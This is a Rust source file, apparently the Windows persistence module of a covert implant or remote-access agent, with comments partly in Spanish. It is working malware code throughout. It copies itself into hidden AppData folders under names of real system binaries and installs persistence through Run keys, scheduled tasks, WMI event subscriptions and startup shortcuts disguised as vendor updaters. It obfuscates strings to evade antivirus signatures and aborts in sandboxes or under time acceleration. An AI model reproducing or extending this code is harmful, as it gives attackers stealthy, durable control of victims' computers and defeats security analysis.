//! Persistence module for Windows systems
//!
//! Implements stealthy persistence mechanisms avoiding common AV signatures

use crate::debug_print;
use obfstr::obfstr;
use std::env;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
#[cfg(target_os = "windows")]
use std::process::Command;

// Anti-sandbox constants
#[cfg(target_os = "windows")]
const MIN_CPU_CORES: usize = 2;
#[cfg(target_os = "windows")]
const MIN_UPTIME_MS: u64 = 180_000; // 3 minutes

// File copy anti-signature constants
#[cfg(target_os = "windows")]
const CHUNK_SIZES: [usize; 4] = [12288, 16384, 8192, 24576];
#[cfg(target_os = "windows")]
const MAX_CHUNK_SIZE: usize = 24576;

/// Métodos de persistencia disponibles
#[derive(Debug, Clone, Copy)]
pub enum PersistenceMethod {
    RegistryRun,
    ScheduledTask,
    WmiEvent,
    StartupFolder,
}

impl PersistenceMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
            "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
            "wmi" => Some(PersistenceMethod::WmiEvent),
            "startup" => Some(PersistenceMethod::StartupFolder),
            _ => None,
        }
    }
}

/// Verifica si la ruta actual es persistente y estable
#[cfg(target_os = "windows")]
fn is_persistent_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        path_upper.contains("\\APPDATA\\")
            || path_upper.contains("\\PROGRAMDATA\\")
            || path_upper.contains("\\PROGRAM FILES")
            || path_upper.contains("\\WINDOWS\\")
    } else {
        false
    }
}

/// Verifica si la ubicación es temporal/volátil
#[cfg(target_os = "windows")]
fn is_temporary_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        path_upper.contains("\\DOWNLOADS\\")
            || path_upper.contains("\\DESKTOP\\")
            || path_upper.contains("\\TEMP\\")
            || path_upper.contains("\\TMP\\")
            || path_upper.contains("\\DOCUMENTS\\")
            || (path_upper.len() >= 3
                && (path_upper.starts_with("D:\\")
                    || path_upper.starts_with("E:\\")
                    || path_upper.starts_with("F:\\")
                    || path_upper.starts_with("G:\\")
                    || path_upper.starts_with("H:\\")))
    } else {
        false
    }
}

/// Copia el ejecutable a ubicación persistente con técnicas anti-AV
#[cfg(target_os = "windows")]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    use std::fs;
    use std::io::{Read, Write};

    // Si ya está en ubicación persistente, usar esa
    if is_persistent_location(current_exe) && !is_temporary_location(current_exe) {
        return Ok(current_exe.to_path_buf());
    }

    // Obtener AppData con fallback
    let localappdata_key = obfstr!("LOCALAPPDATA").to_string();
    let appdata_key = obfstr!("APPDATA").to_string();
    let localappdata = env::var(&localappdata_key)
        .or_else(|_| env::var(&appdata_key))
        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());

    // Ubicaciones sigilosas que imitan procesos legítimos del sistema
    // Using more obscure directories that are less monitored
    let stealth_targets = [
        (
            format!("{}\\Microsoft\\Windows\\Explorer", localappdata),
            "SearchIndexer.exe",
        ),
        (
            format!("{}\\Microsoft\\Windows\\Caches", localappdata),
            "fontdrvhost.exe",
        ),
        (
            format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata),
            "RuntimeBroker.exe",
        ),
        (
            format!(
                "{}\\Microsoft\\InputPersonalization\\TrainedDataStore",
                localappdata
            ),
            "ctfmon.exe",
        ),
    ];

    let idx = get_machine_index() % stealth_targets.len();
    let (target_dir, target_name) = &stealth_targets[idx];

    // Crear directorio recursivamente
    let target_path_dir = PathBuf::from(target_dir);
    let _ = fs::create_dir_all(&target_path_dir);

    let target_path = target_path_dir.join(target_name);

    // Si ya existe con tamaño razonable, reutilizar
    if target_path.exists() {
        if let Ok(meta) = fs::metadata(&target_path) {
            if meta.len() > 100000 {
                return Ok(target_path);
            }
        }
    }

    // Copiar usando chunks de tamaño variable (anti-signature)
    let mut source = fs::File::open(current_exe).map_err(|e| format!("E1: {}", e))?;
    let mut dest = fs::File::create(&target_path).map_err(|e| format!("E2: {}", e))?;

    // Tamaños de chunk variables para evitar patrones
    let mut buffer = vec![0u8; MAX_CHUNK_SIZE];
    let mut chunk_idx = 0;

    loop {
        let chunk_size = CHUNK_SIZES[chunk_idx % CHUNK_SIZES.len()];
        let n = source
            .read(&mut buffer[..chunk_size])
            .map_err(|e| format!("E3: {}", e))?;
        if n == 0 {
            break;
        }
        dest.write_all(&buffer[..n])
            .map_err(|e| format!("E4: {}", e))?;
        chunk_idx += 1;
    }
    dest.flush().map_err(|e| format!("E5: {}", e))?;
    drop(dest);

    // Verificar que se copió correctamente
    if fs::metadata(&target_path).is_err() {
        return Err("Copy verification failed".to_string());
    }

    // Aplicar atributos oculto+sistema para stealth
    let attrib_exe = obfstr!("attrib").to_string();
    let _ = Command::new(&attrib_exe)
        .args(&["+h", "+s", target_path.to_str().unwrap()])
        .creation_flags(0x08000000)
        .output();

    // Delay anti-heurística variable
    let delay_ms = 30 + (get_machine_index() % 50) as u64;
    std::thread::sleep(std::time::Duration::from_millis(delay_ms));

    Ok(target_path)
}

#[cfg(not(target_os = "windows"))]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    Ok(current_exe.to_path_buf())
}

/// Obtiene ruta del ejecutable en ubicación persistente
#[cfg(target_os = "windows")]
fn get_current_exe_path() -> Result<PathBuf, String> {
    let current_exe = env::current_exe().map_err(|e| format!("E0: {}", e))?;
    ensure_persistent_location(&current_exe)
}

/// Generate a pseudo-random index based on machine-specific data
/// This ensures consistency per machine but variation across machines
#[cfg(target_os = "windows")]
fn get_machine_index() -> usize {
    let username = env::var("USERNAME").unwrap_or_default();
    let computername = env::var("COMPUTERNAME").unwrap_or_default();
    let pid = std::process::id();

    let mut hash: usize = 0;
    for byte in username.bytes() {
        hash = hash.wrapping_add(byte as usize).wrapping_mul(31);
    }
    for byte in computername.bytes() {
        hash = hash.wrapping_add(byte as usize).wrapping_mul(17);
    }
    hash.wrapping_add(pid as usize)
}

/// Escape special characters in path for safe shell execution
/// Replaces problematic characters that could be used for command injection
#[cfg(target_os = "windows")]
fn escape_shell_path(path: &str) -> String {
    // In Windows cmd.exe, the main concerns are:
    // - & (command separator)
    // - | (pipe)
    // - ^ (escape character)
    // - < > (redirection)
    // - " (quote - handled by our quoting)
    // Since we wrap paths in double quotes, most special chars are safe
    // We escape ^ and % which have special meaning even inside quotes
    path.replace("^", "^^").replace("%", "%%")
}

/// Registry Run persistence - método más simple y efectivo
/// Uses cmd /c start /min wrapper to hide execution window
/// Note: The agent must be compiled with --features production for windowless operation
#[cfg(target_os = "windows")]
fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Polymorphic registry value names that look legitimate
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "NVDisplay.Container",
        "iTunesHelper",
        "Spotify",
    ];
    let idx = get_machine_index() % reg_names.len();
    let reg_name = reg_names[idx];

    // Use cmd /c start /b for background, hidden execution
    let obf_cmd = format!(r#"cmd /c start /b "" "{}""#, exe_str);

    // Registry key path
    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let reg_exe = obfstr!("reg").to_string();

    let output = Command::new(&reg_exe)
        .args(&[
            "add", &reg_key, "/v", reg_name, "/t", "REG_SZ", "/d", &obf_cmd, "/f",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E6: {}", e))?;

    if output.status.success() {
        Ok(format!("Registry: {} -> {}", reg_name, exe_str))
    } else {
        Err(format!(
            "E7: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        ))
    }
}

/// Scheduled Task persistence with enhanced evasion
/// Uses cmd wrapper with delayed execution - avoids PowerShell for lower AV detection
#[cfg(target_os = "windows")]
fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Polymorphic task names
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDriveStandaloneUpdate",
        "Adobe Acrobat Update",
        "CCleaner Smart Cleaning",
        "NvTmRepOnLogon",
        "DropboxUpdate",
    ];
    let idx = get_machine_index() % task_names.len();
    let task_name = task_names[idx];

    let schtasks_exe = obfstr!("schtasks").to_string();

    // Delete existing task if present (silently)
    let _ = Command::new(&schtasks_exe)
        .args(&["/Delete", "/TN", task_name, "/F"])
        .creation_flags(0x08000000)
        .output();

    // Random delay between 60-180 seconds for anti-behavioral detection
    let delay_secs = 60 + (get_machine_index() % 120);

    // Escape path for shell execution
    let exe_escaped = escape_shell_path(exe_str);

    // Task command with delay and hidden execution
    let task_cmd = format!(
        r#"cmd.exe /c timeout /t {} /nobreak >nul && start /min "" "{}""#,
        delay_secs, exe_escaped
    );

    // Create scheduled task on logon with additional delay
    let output = Command::new(&schtasks_exe)
        .args(&[
            "/Create", "/SC", "ONLOGON", "/TN", task_name, "/TR", &task_cmd, "/DELAY", "0001:00",
            "/F", "/RL", "LIMITED",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E8: {}", e))?;

    if output.status.success() {
        Ok(format!(
            "Task: {} -> {} (delay: {}s)",
            task_name, exe_str, delay_secs
        ))
    } else {
        Err(format!(
            "E9: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        ))
    }
}

/// WMI Event Subscription persistence
/// Uses time-based triggers which are less monitored than logon events
/// Note: WMI persistence requires admin rights and may not work on all systems
/// Uses cmd.exe wrapper for execution to avoid PowerShell detection on trigger
#[cfg(target_os = "windows")]
fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Polymorphic WMI event names
    let wmi_names = [
        "BfeOnServiceStateChange",
        "SystemTimeUpdate",
        "LocalTimeSync",
        "WindowsEventForwarder",
    ];
    let idx = get_machine_index() % wmi_names.len();
    let event_name = wmi_names[idx];

    // Escape backslashes for PowerShell
    let exe_escaped = exe_str.replace("\\", "\\\\");

    // Use raw string for WMI root namespace path to prevent escape sequence interpretation
    // Note: \r in \root would be interpreted as carriage return without raw string
    let wmi_root = r"\\.\root\subscription";
    let cimv2_ns = r"root\cimv2";

    // Escape for WMI CommandLineTemplate (needs extra escaping inside PowerShell string)
    let exe_wmi_escaped = exe_escaped.replace("\\", "\\\\");

    // Random hour for trigger (less predictable)
    let trigger_hour = 8 + (get_machine_index() % 8); // 8am-4pm range

    // Compact PowerShell WMI script
    let ps_script = format!(
        concat!(
            "$F=([wmiclass]'{}:__EventFilter').CreateInstance();",
            "$F.Name='{}';",
            "$F.EventNamespace='{}';",
            "$F.QueryLanguage='WQL';",
            "$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 14400 ",
            "WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour={}';",
            "$F.Put()|Out-Null;",
            "$C=([wmiclass]'{}:CommandLineEventConsumer').CreateInstance();",
            "$C.Name='{}';",
            "$C.CommandLineTemplate='cmd.exe /c start /min \"\" \"{}\"';",
            "$C.Put()|Out-Null;",
            "$B=([wmiclass]'{}:__FilterToConsumerBinding').CreateInstance();",
            "$B.Filter=$F;$B.Consumer=$C;",
            "$B.Put()|Out-Null"
        ),
        wmi_root,
        event_name,
        cimv2_ns,
        trigger_hour,
        wmi_root,
        event_name,
        exe_wmi_escaped,
        wmi_root
    );

    let ps_exe = obfstr!("powershell").to_string();
    let output = Command::new(&ps_exe)
        .args(&[
            "-NoProfile",
            "-WindowStyle",
            "Hidden",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &ps_script,
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E10: {}", e))?;

    let stderr = String::from_utf8_lossy(&output.stderr);
    if output.status.success() || stderr.is_empty() {
        Ok(format!(
            "WMI: {} -> {} (trigger: {}:00)",
            event_name, exe_str, trigger_hour
        ))
    } else {
        Err(format!("E11: {}", stderr.trim()))
    }
}

/// Startup folder persistence using shortcut file
/// DISABLED: Too easily detected by AV - use registry or task instead
#[cfg(target_os = "windows")]
fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Get startup folder path
    let appdata_key = obfstr!("APPDATA").to_string();
    let startup = env::var(&appdata_key)
        .map(|p| format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", p))
        .unwrap_or_else(|_| {
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".to_string()
        });

    // Polymorphic shortcut names
    let lnk_names = [
        "WindowsSecurity.lnk",
        "OneDriveSync.lnk",
        "AdobeUpdater.lnk",
        "ChromeHelper.lnk",
        "EdgeUpdate.lnk",
    ];
    let idx = get_machine_index() % lnk_names.len();
    let lnk_name = lnk_names[idx];
    let lnk_path = format!("{}\\{}", startup, lnk_name);

    // PowerShell to create shortcut with WindowStyle=7 (minimized)
    let ps_script = format!(
        r#"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('{}');$s.TargetPath='{}';$s.WindowStyle=7;$s.Save()"#,
        lnk_path.replace("'", "''"),
        exe_str.replace("'", "''")
    );

    let ps_exe = obfstr!("powershell").to_string();
    let output = Command::new(&ps_exe)
        .args(&[
            "-NoProfile",
            "-WindowStyle",
            "Hidden",
            "-NonInteractive",
            "-Command",
            &ps_script,
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E12: {}", e))?;

    if output.status.success() {
        Ok(format!("Startup: {}", lnk_path))
    } else {
        Err(format!(
            "E13: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        ))
    }
}

// ============================================================================
// Environment Keying / Anti-Sandbox
// ============================================================================

/// Check if system looks like a real workstation vs sandbox
/// This prevents persistence in analysis environments
#[cfg(target_os = "windows")]
fn environment_check() -> bool {
    // Check 1: Minimum CPU cores (most sandboxes have 1)
    let cpus = std::thread::available_parallelism()
        .map(|p| p.get())
        .unwrap_or(1);
    if cpus < MIN_CPU_CORES {
        return false;
    }

    // Check 2: Uptime check - real systems have some uptime
    // Sandboxes are freshly booted
    let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
    if uptime_ms < MIN_UPTIME_MS {
        return false;
    }

    true
}

#[cfg(not(target_os = "windows"))]
fn environment_check() -> bool {
    true
}

/// Establece persistencia usando el método especificado
/// Includes environment keying to avoid sandbox detection
pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    {
        return Err("Windows only".to_string());
    }

    #[cfg(target_os = "windows")]
    {
        // Environment check - don't persist in sandboxes
        if !environment_check() {
            // Return success silently to not alert that sandbox was detected
            return Ok("OK".to_string());
        }

        // Obtener ruta en ubicación persistente
        let exe_path = get_current_exe_path()?;

        // Small timing jitter before persistence operation
        let jitter_ms = 50 + (get_machine_index() % 100) as u64;
        std::thread::sleep(std::time::Duration::from_millis(jitter_ms));

        match method {
            PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
            PersistenceMethod::ScheduledTask => persist_scheduled_task(&exe_path),
            PersistenceMethod::WmiEvent => persist_wmi_event(&exe_path),
            PersistenceMethod::StartupFolder => persist_startup_folder(&exe_path),
        }
    }
}

/// Remueve persistencia (limpieza completa)
#[cfg(target_os = "windows")]
pub fn remove_persistence() -> Result<String, String> {
    use std::fs;

    let reg_exe = obfstr!("reg").to_string();
    let schtasks_exe = obfstr!("schtasks").to_string();
    let ps_exe = obfstr!("powershell").to_string();
    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();

    // Registry Run - multiple possible names
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "TeamsMachineInstaller",
        "NVDisplay.Container",
        "iTunesHelper",
        "Spotify",
    ];
    for name in &reg_names {
        let _ = Command::new(&reg_exe)
            .args(&["delete", &reg_key, "/v", name, "/f"])
            .creation_flags(0x08000000)
            .output();
    }

    // Scheduled Tasks
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDriveStandaloneUpdate",
        "Adobe Acrobat Update",
        "CCleaner Smart Cleaning",
        "NvTmRepOnLogon",
        "DropboxUpdate",
        "AdobeFlashPlayerUpdater",
        "CCleanerCrashReporting",
    ];
    for task in &task_names {
        let _ = Command::new(&schtasks_exe)
            .args(&["/Delete", "/TN", task, "/F"])
            .creation_flags(0x08000000)
            .output();
    }

    // WMI Events cleanup
    let wmi_names = [
        "BfeOnServiceStateChange",
        "SystemTimeUpdate",
        "LocalTimeSync",
        "WindowsEventForwarder",
        "PerformanceMonitor",
        "SystemEventsBroker",
    ];
    let wmi_cleanup = format!(
        concat!(
            "$names=@('{}');",
            "foreach($n in $names){{",
            "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='$n'\" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue;",
            "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='$n'\" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue",
            "}};",
            "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue|",
            "Where-Object{{$_.Filter -match 'Bfe|Time|Forwarder|Performance|Events'}}|",
            "Remove-WmiObject -EA SilentlyContinue"
        ),
        wmi_names.join("','")
    );
    let _ = Command::new(&ps_exe)
        .args(&["-NoProfile", "-Command", &wmi_cleanup])
        .creation_flags(0x08000000)
        .output();

    // Startup shortcuts
    let appdata_key = obfstr!("APPDATA").to_string();
    let appdata = env::var(&appdata_key).unwrap_or_default();
    let lnk_names = [
        "WindowsSecurity.lnk",
        "OneDriveSync.lnk",
        "AdobeUpdater.lnk",
        "ChromeHelper.lnk",
        "EdgeUpdate.lnk",
    ];
    for lnk in &lnk_names {
        let lnk_path = format!(
            "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}",
            appdata, lnk
        );
        let _ = fs::remove_file(&lnk_path);
    }

    // Remove copied executables from stealth locations
    let localappdata_key = obfstr!("LOCALAPPDATA").to_string();
    let localappdata = env::var(&localappdata_key).unwrap_or_default();
    let exe_copies = [
        // New locations
        format!(
            "{}\\Microsoft\\Windows\\Explorer\\SearchIndexer.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\Caches\\fontdrvhost.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\WER\\ReportQueue\\RuntimeBroker.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\InputPersonalization\\TrainedDataStore\\ctfmon.exe",
            localappdata
        ),
        // Legacy locations
        format!("{}\\Microsoft\\Windows\\Caches\\WmiPrvSE.exe", localappdata),
        format!(
            "{}\\Microsoft\\Windows\\WER\\ReportQueue\\conhost.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\OneDrive\\logs\\OneDriveStandaloneUpdater.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\INetCache\\Low\\MoUsoCoreWorker.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Edge\\User Data\\msedge_proxy.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\WindowsApps\\RuntimeBroker.exe",
            localappdata
        ),
    ];
    for exe in &exe_copies {
        let _ = fs::remove_file(exe);
    }

    Ok("Persistence removed (all methods)".to_string())
}

#[cfg(not(target_os = "windows"))]
pub fn remove_persistence() -> Result<String, String> {
    Err("Windows only".to_string())
}

// ============================================================================
// Automatic Persistence with Evasion
// ============================================================================

#[cfg(target_os = "windows")]
use std::sync::atomic::{AtomicBool, Ordering};

/// Flag to track if automatic persistence has been established
/// Uses atomic bool for thread-safe access
#[cfg(target_os = "windows")]
static AUTO_PERSIST_DONE: AtomicBool = AtomicBool::new(false);

// Auto-persistence timing constants
#[cfg(target_os = "windows")]
const AUTO_PERSIST_BASE_DELAY_SECS: u64 = 180; // 3 minutes base delay
#[cfg(target_os = "windows")]
const AUTO_PERSIST_JITTER_MAX: usize = 120; // Max jitter in seconds (0-120)
#[cfg(target_os = "windows")]
const AUTO_PERSIST_CHUNK_SECS: u64 = 30; // Sleep chunk size in seconds
#[cfg(target_os = "windows")]
const AUTO_PERSIST_TIME_ACCEL_THRESHOLD: u64 = 25; // If sleep < this, time acceleration detected
// Use MIN_UPTIME_MS (3 min) for the final check since by the time auto-persistence runs,
// we've already waited 3-5 minutes, so the system has been up long enough if it passed
// the initial environment checks. 10 minutes was too restrictive for VM testing.

/// Marker file to check if persistence was already established in a previous run
#[cfg(target_os = "windows")]
fn get_persistence_marker_path() -> PathBuf {
    let localappdata = env::var(obfstr!("LOCALAPPDATA").to_string())
        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    PathBuf::from(format!(
        "{}\\Microsoft\\Windows\\Caches\\{}.dat",
        localappdata,
        obfstr!("syscache")
    ))
}

/// Check if persistence marker exists (already persisted in previous run)
#[cfg(target_os = "windows")]
fn persistence_marker_exists() -> bool {
    get_persistence_marker_path().exists()
}

/// Create persistence marker file
#[cfg(target_os = "windows")]
fn create_persistence_marker() {
    use std::fs;
    let marker_path = get_persistence_marker_path();

    // Create parent directory if needed
    if let Some(parent) = marker_path.parent() {
        let _ = fs::create_dir_all(parent);
    }

    // Write marker with some random-looking data
    let marker_data = format!(
        "{}{}{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs(),
        get_machine_index()
    );
    let _ = fs::write(&marker_path, marker_data.as_bytes());

    // Set hidden attribute
    let attrib_exe = obfstr!("attrib").to_string();
    let _ = Command::new(&attrib_exe)
        .args(&["+h", "+s", marker_path.to_str().unwrap_or("")])
        .creation_flags(0x08000000)
        .output();
}

/// Schedule automatic persistence to be established after a delay
/// This runs in a background thread and uses timing jitter for evasion
///
/// Features:
/// - Random delay between 3-5 minutes (anti-behavioral)
/// - Uses registry persistence (most reliable, no UAC)
/// - Marker file to avoid re-persisting on each run
/// - Environment keying (anti-sandbox)
/// - Indirect syscalls for memory operations (if available)
#[cfg(target_os = "windows")]
pub fn schedule_auto_persistence() {
    use std::thread;

    // Check if already done in this session
    if AUTO_PERSIST_DONE.load(Ordering::SeqCst) {
        debug_print!("DEBUG: [AUTO-PERSIST] Already done in this session, skipping");
        return;
    }

    // Check if marker exists (persisted in previous run)
    if persistence_marker_exists() {
        debug_print!("DEBUG: [AUTO-PERSIST] Marker file exists, already persisted in previous run");
        AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
        return;
    }

    // Spawn background thread for auto-persistence
    thread::spawn(|| {
        // ====================================================================
        // TIMING EVASION: Random delay 3-5 minutes with jitter
        // ====================================================================
        // This evades sandboxes that:
        // 1. Only analyze for short periods (< 3 min)
        // 2. Accelerate time (we use real-time checks)
        // 3. Look for immediate persistence behavior

        let jitter_secs = get_machine_index() % AUTO_PERSIST_JITTER_MAX;
        let total_delay = AUTO_PERSIST_BASE_DELAY_SECS + jitter_secs as u64;

        debug_print!(
            "DEBUG: [AUTO-PERSIST] Starting with {}s delay ({}s base + {}s jitter)",
            total_delay,
            AUTO_PERSIST_BASE_DELAY_SECS,
            jitter_secs
        );

        // Sleep in chunks to avoid detection of long sleep calls
        // Some sandboxes hook Sleep() and fast-forward
        let chunks = total_delay / AUTO_PERSIST_CHUNK_SECS;
        let remainder = total_delay % AUTO_PERSIST_CHUNK_SECS;

        for chunk_num in 0..chunks {
            // Use real-time validation between chunks
            let start = std::time::Instant::now();
            std::thread::sleep(std::time::Duration::from_secs(AUTO_PERSIST_CHUNK_SECS));

            let elapsed = start.elapsed().as_secs();
            debug_print!(
                "DEBUG: [AUTO-PERSIST] Sleep chunk {}/{} completed ({}s elapsed)",
                chunk_num + 1,
                chunks,
                elapsed
            );

            // Anti-time-acceleration check: if sleep completed too fast,
            // sandbox might be accelerating time - abort
            if elapsed < AUTO_PERSIST_TIME_ACCEL_THRESHOLD {
                debug_print!(
                    "DEBUG: [AUTO-PERSIST] ❌ Time acceleration detected ({}s < {}s threshold), aborting",
                    elapsed,
                    AUTO_PERSIST_TIME_ACCEL_THRESHOLD
                );
                return; // Time acceleration detected, abort persistence
            }
        }

        if remainder > 0 {
            debug_print!("DEBUG: [AUTO-PERSIST] Sleeping remainder {}s", remainder);
            std::thread::sleep(std::time::Duration::from_secs(remainder));
        }

        debug_print!("DEBUG: [AUTO-PERSIST] Delay complete, running environment checks...");

        // ====================================================================
        // ENVIRONMENT KEYING: Additional sandbox checks before persistence
        // ====================================================================
        if !environment_check() {
            debug_print!("DEBUG: [AUTO-PERSIST] ❌ Environment check failed, aborting");
            return; // Sandbox detected, abort silently
        }

        debug_print!("DEBUG: [AUTO-PERSIST] ✅ Environment check passed");

        // Additional check: system uptime should be at least 3 minutes
        // By this point we've already waited 3-5 minutes, so this is a sanity check
        let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
        if uptime_ms < MIN_UPTIME_MS {
            debug_print!(
                "DEBUG: [AUTO-PERSIST] ❌ Uptime too low ({}ms < {}ms), aborting",
                uptime_ms,
                MIN_UPTIME_MS
            );
            return; // Freshly booted system, likely sandbox
        }

        debug_print!(
            "DEBUG: [AUTO-PERSIST] ✅ Uptime check passed ({}ms)",
            uptime_ms
        );

        // ====================================================================
        // STEALTH PERSISTENCE: Use registry method (most reliable)
        // ====================================================================
        // Registry persistence is chosen because:
        // 1. No UAC prompt required (HKCU)
        // 2. More reliable than scheduled tasks
        // 3. Less monitored than WMI subscriptions
        // 4. Works on all Windows versions

        debug_print!("DEBUG: [AUTO-PERSIST] Establishing registry persistence...");

        // Mark as done first to prevent race conditions
        AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);

        // Establish persistence
        match establish_persistence(PersistenceMethod::RegistryRun) {
            Ok(msg) => {
                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Persistence established: {}", msg);
                // Create marker to avoid re-persisting on next run
                create_persistence_marker();
                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
            }
            Err(e) => {
                debug_print!("DEBUG: [AUTO-PERSIST] ❌ Failed to establish persistence: {}", e);
            }
        }
    });
}

/// Dummy implementation for non-Windows
#[cfg(not(target_os = "windows"))]
pub fn schedule_auto_persistence() {
    // No-op on non-Windows
}

// ============================================================================
// Indirect Syscall Support
// ============================================================================
// The actual indirect syscall implementations are in syscalls.rs
// Here we just re-export the availability check for use in this module

/// Check if indirect syscalls are available
/// Re-exports the check from syscalls module
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub fn is_indirect_syscall_available() -> bool {
    crate::syscalls::is_indirect_syscall_available()
}
